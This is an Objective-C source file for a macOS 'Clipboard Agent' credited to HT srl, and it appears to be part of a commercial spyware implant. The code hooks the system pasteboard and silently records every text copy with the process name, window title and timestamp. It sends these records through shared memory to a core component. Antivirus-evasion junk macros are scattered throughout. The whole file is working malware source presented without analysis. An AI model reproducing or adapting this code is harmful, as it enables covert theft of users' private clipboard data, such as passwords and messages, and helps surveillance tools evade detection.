/*
 * RCSMac - Clipboard Agent
 * 
 *
 * Created by Massimo Chiodini on 17/06/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSMAgentClipboard.h"
#import "RCSMInputManager.h"
#import "RCSMCommon.h"

#import "RCSMAVGarbage.h"

//#define DEBUG

@implementation NSPasteboard (clipboardHook)

- (BOOL)setDataHook:(NSData *)data forType:(NSString *)dataType
{    
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSString      *_windowName;
  NSMutableData *processName;
  NSMutableData *windowName;
  short unicodeNullTerminator = 0x0000;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
#ifdef DEBUG
  NSLog(@"setDataHook: logging clipboard for dataType [%@]", dataType);
#endif

  BOOL bRet = [self setDataHook: data forType: dataType];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // Take text only
  if ([dataType compare: NSStringPboardType] == NSOrderedSame)
    {
      NSString *dataString = [[NSString alloc] initWithData: data
                                                   encoding: NSUTF8StringEncoding];
      
      NSMutableData *clipboardContent = [[NSMutableData alloc] initWithData:
                                         [dataString dataUsingEncoding:
                                          NSUTF16LittleEndianStringEncoding
                                                  allowLossyConversion: true]];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
      NSMutableData *entryData = [[NSMutableData alloc] init];
      
      NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
      NSString *_processName      = [[processInfo processName] copy];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      time_t rawtime;
      struct tm *tmTemp;
      
      processName  = [[NSMutableData alloc] initWithData:
                      [_processName dataUsingEncoding:
                       NSUTF16LittleEndianStringEncoding]];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      // Struct tm
      time (&rawtime);
      tmTemp = gmtime(&rawtime);
      tmTemp->tm_year += 1900;
      tmTemp->tm_mon  ++;
    
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      if (sizeof(long) == 4) // 32bit
        {
          [entryData appendBytes: (const void *)tmTemp
                          length: sizeof (struct tm) - 0x8];
        }
      else if (sizeof(long) == 8) // 64bit
        {
          [entryData appendBytes: (const void *)tmTemp
                          length: sizeof (struct tm) - 0x14];
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      // Process Name
      [entryData appendData: processName];
      // Null terminator
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];
          
      // AV evasion: only on release build
      AV_GARBAGE_006
    
      // Window Name
      _windowName = [[[[NSApplication sharedApplication] mainWindow] title] copy];
      
      if (_windowName == nil || [_windowName length] == 0) 
        _windowName = @"unknown";
      
      windowName = [[NSMutableData alloc] initWithData:
                    [_windowName dataUsingEncoding:
                     NSUTF16LittleEndianStringEncoding]];
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      [entryData appendData: windowName];
    
      // Null terminator
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      // Clipboard
      [entryData appendData: clipboardContent];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      // Null terminator
      [entryData appendBytes: &unicodeNullTerminator
                      length: sizeof(short)];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      // Delimiter
      uint32_t del = LOG_DELIMITER;
      [entryData appendBytes: &del
                      length: sizeof(del)];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      [_windowName release];
      [processName release];
      [windowName release];
      [clipboardContent release];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
      shMemoryHeader->status          = SHMEM_WRITTEN;
      shMemoryHeader->agentID         = AGENT_CLIPBOARD;
      shMemoryHeader->direction       = D_TO_CORE;
      shMemoryHeader->commandType     = CM_LOG_DATA;
      shMemoryHeader->flag            = 0;
      shMemoryHeader->commandDataSize = [entryData length];
      
      memcpy(shMemoryHeader->commandData,
             [entryData bytes],
             [entryData length]);
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if ([mSharedMemoryLogging writeMemory: logData
                                     offset: 0
                              fromComponent: COMP_AGENT] == TRUE)
        {
#ifdef DEBUG
          NSLog(@"setDataHook: clipboard logged: %@", dataString);
#endif
        }
#ifdef DEBUG
      else
        NSLog(@"setDataHook: Error while logging clipboard to shared memory");
#endif
      
      [_processName release];
      [entryData release];
      [dataString release];
      [logData release];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  return bRet;
}

@end
